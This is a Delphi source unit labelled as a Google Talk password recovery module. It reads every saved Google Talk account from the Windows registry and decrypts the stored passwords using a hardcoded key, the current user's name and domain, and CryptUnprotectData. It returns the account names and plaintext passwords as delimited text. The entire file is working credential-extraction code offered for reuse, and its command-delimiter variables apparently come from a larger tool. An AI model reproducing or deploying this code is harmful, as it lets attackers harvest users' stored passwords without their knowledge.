unit PasswordRecovery;

{
 '*******************************************************
'*  Module  : GTalk-Password Recovery
'*  Author  : Arethusa
'*  GTalk Password Recovery, thanks to kscm, who gave
'*  me a snippet which wasn't working, but it was a
'*  beginning... This snippet has no author :( So I
'*  don't know, who I should give credits...
'*  Leave Credits if you use this module!
'*******************************************************
}

interface

uses
  StrUtils,Windows,
  CryptAPI,
  xMiniReg;

Function GetGTalkPW(Delimitador: string): String;

implementation

function SysErrorMessage(ErrorCode: Integer): string;
var
  Buffer: array[0..255] of Char;
var
  Len: Integer;
begin
  Len := FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM or FORMAT_MESSAGE_IGNORE_INSERTS or
    FORMAT_MESSAGE_ARGUMENT_ARRAY, nil, ErrorCode, 0, Buffer,
    SizeOf(Buffer), nil);
  while (Len > 0) and (Buffer[Len - 1] in [#0..#32, '.']) do Dec(Len);
  SetString(Result, Buffer, Len);
end;

const
  SEED_CONSTANT = $BA0DA71D;
  SecretKey : Array[0..15] Of Byte = ($A3,$1E,$F3,$69,
                                      $07,$62,$D9,$1F,
                                      $1E,$E9,$35,$7D,
                                      $4F,$D2,$7D,$48);

type
  PByteArray = ^TByteArray;
  TByteArray = array[0..32767] of Byte;

  TCharArray = Array[0..1023] Of Char;
  _TOKEN_USER = record
    User: SID_AND_ATTRIBUTES;
  end;
type
  TOKEN_USER = _TOKEN_USER;
  TTokenUser = TOKEN_USER;
  PTokenUser = ^TOKEN_USER;

    function Decode(var Output: String; PassEntry: String; EntryLen: DWORD): Boolean;
    var
      Ret : Integer;
      hToken : nativeuint;
      SID,
      Name,
      Domain : Array[0..511] Of Char;
      SIDSize,
      I,
      J : DWORD;
      CCHName,
      CCHDomain : DWORD;
      PEUse : SID_NAME_USE;
      SIDUser : PTokenUser;
      StaticKey : TByteArray;
      SeedArr: TByteArray;
      Seed : DWORD;
      A, B : PByteArray;
      DataIn,
      DataEntropy,
      DataOut : DATA_BLOB;
      test:cardinal;
      Pass:TByteArray;
    begin
      Ret := 0;
      SIDSize := 0;
      SIDUser := PTokenUser(@SID);
      Move(SecretKey,StaticKey,SizeOf(SecretKey));
      If OpenProcessToken(GetCurrentProcess,TOKEN_QUERY,hToken) Then
        begin
        If GetTokenInformation(hToken,TokenUser,SIDUser,SizeOf(SID),SIDSize) Then
          begin
          CCHName := SizeOf(Name);
          CCHDomain := SizeOf(Domain);
          If LookupAccountSID(nil,SIDUser.User.Sid,Name,CCHName,Domain,CCHDomain,PEUse) Then
            begin
            Seed := SEED_CONSTANT;
            i:=0;
            While (i<=CCHName-1) do begin
              test:=StaticKey[(I MOD 4)*4+3]*$1000000+StaticKey[(I MOD 4)*4+2]*$10000+StaticKey[(I MOD 4)*4+1]*$100+StaticKey[(I MOD 4)*4]*1;
              test:=test xor (ord(Name[i])*Seed);
              StaticKey[(i MOD 4)*4+3] := ((test and $FF000000) div $1000000);
              StaticKey[(i MOD 4)*4+2] := ((test and $00FF0000) div $10000);
              StaticKey[(i MOD 4)*4+1] := ((test and $0000FF00) div $100);
              StaticKey[(i MOD 4)*4+0] :=   test and $000000FF;
              Seed := Seed * $BC8F;
              inc(i);
            end;
            For J := 0 To CCHDomain - 1 Do
              begin
              test:=StaticKey[(I MOD 4)*4+3]*$1000000+StaticKey[(I MOD 4)*4+2]*$10000+StaticKey[(I MOD 4)*4+1]*$100+StaticKey[(I MOD 4)*4]*1;
              test:=test xor (ord(Domain[j])*Seed);
              StaticKey[(i MOD 4)*4+3] := ((test and $FF000000) div $1000000);
              StaticKey[(i MOD 4)*4+2] := ((test and $00FF0000) div $10000);
              StaticKey[(i MOD 4)*4+1] := ((test and $0000FF00) div $100);
              StaticKey[(i MOD 4)*4+0] :=   test and $000000FF;
              Seed := Seed * $BC8F;
              Inc(I);
            end;
            SeedArr[0]:=StaticKey[0]; SeedArr[1]:=StaticKey[1]; SeedArr[2]:=StaticKey[2]; SeedArr[3]:=StaticKey[3];
            SeedArr[0]:=SeedArr[0] or 1;
            Seed := (SeedArr[3]*$1000000+SeedArr[2]*$10000+SeedArr[1]*$100+(SeedArr[0]*1));
            A := PByteArray(@PassEntry[5]);
            B := PByteArray(@PassEntry[6]);
            I := 0;
            While I < EntryLen Do
              begin
              Pass[I div 2] := Byte(((A[I] - 1) * 16) Or (B[I] - 33) - (Seed AND $0000FFFF));
              Seed := Seed * $10FF5;
              Inc(I,2);
            end;
            DataEntropy.cbData := SizeOf(SecretKey);
            DataEntropy.pbData := @StaticKey;
            DataIn.cbData := I div 2 -2;
            DataIn.pbData := @Pass;
            If CryptUnprotectData(@DataIn,nil,@DataEntropy,nil,nil,1,@DataOut) Then
              begin
              Output:=PChar(DataOut.pbData);
              SetLength(Output,DataOut.cbData);
              LocalFree(DWORD(Pointer(DataOut.pbData)));
              Ret := 1;
            end
            Else
              begin
              Output:=(SysErrorMessage(GetLastError));
            end;
          end
          Else
            begin
            Output:=(SysErrorMessage(GetLastError));
          end;
        end
        Else
          begin
          Output:=(SysErrorMessage(GetLastError));
        end;
        CloseHandle(hToken);
      end
      Else
        begin
        Output:=(SysErrorMessage(GetLastError));
      end;
      Result := Boolean(Ret);
    end;

Function PrepareAndGetPW(EncryptedKey:String):string;
var
  PWD : TCharArray;
  aOut : String;
  I : Integer;
begin
  for i:=1 To Length(EncryptedKey) do
    PWD[i-1]:=EncryptedKey[i];
  PWD[Length(EncryptedKey)+1]:=#0;
  For I := 0 To High(PWD) Do
    If (PWD[I] = #13) Or (PWD[I] = #10) Then PWD[I] := #0;
  If Decode(aOut,PWD,Length(EncryptedKey)) Then
    begin
    Result:=aOut;
  end
  Else
    begin
    Result:='Error';
  end;
end;


Function GetGTalkPW(Delimitador: string): String;
var
  SL, TempStr, s: widestring;
  Encrypted: String;
begin
  Result:='';
  if xMiniReg.RegKeyExists(HKEY_CURRENT_USER, 'Software\Google\Google Talk\Accounts\') then
  xMiniReg.RegEnumValues(HKEY_CURRENT_USER, 'Software\Google\Google Talk\Accounts\', SL);

  if SL <> '' then
  begin
    while SL <> '' do
    begin
      s := copy(sl, 1, posex(RegeditDelimitador, sl) - 1);
      delete(sl, 1, posex(RegeditDelimitador, sl) - 1);
      delete(sl, 1, length(RegeditDelimitador));

      delete(s, 1, posex(DelimitadorComandos, s) - 1);
      delete(s, 1, length(DelimitadorComandos));
      delete(s, 1, posex(DelimitadorComandos, s) - 1);
      delete(s, 1, length(DelimitadorComandos));

      s := Copy(s, 1, posex(DelimitadorComandos, s) - 3);

      while s <> '' do
      begin
        if posex(#13, s) > 0 then
        begin
          TempStr := TempStr + copy(s, 1, posex(#13, s) - 1) + #13#10;
          delete(s, 1, posex(#13, s));
        end else
        begin
          TempStr := TempStr + s + #13#10;
          s := '';
        end;
      end;
    end;

    if TempStr = '' then Exit;

    Sl := TempStr;
    TempStr := '';
    s := '';

    while posex(#13#10, sl) > 0 do
    begin
      TempStr := Copy(sl, 1, posex(#13#10, sl) - 1);
      delete(sl, 1, posex(#13#10, sl) + 1);

      Result := Result + 'Google Talk' + Delimitador + TempStr + Delimitador;
      s := '';
      if xMiniReg.RegGetString(HKEY_CURRENT_USER, 'Software\Google\Google Talk\Accounts\' + TempStr + '\' + 'pw', s) then
      begin
        Encrypted := s;
        if Encrypted <> '' then Result := Result + PrepareAndGetPW(Encrypted) + Delimitador + #13#10
        else Result := Result + Delimitador + #13#10;
      end else Result := Result + Delimitador + #13#10;
    end;
  end else Result := '';
end;

end.
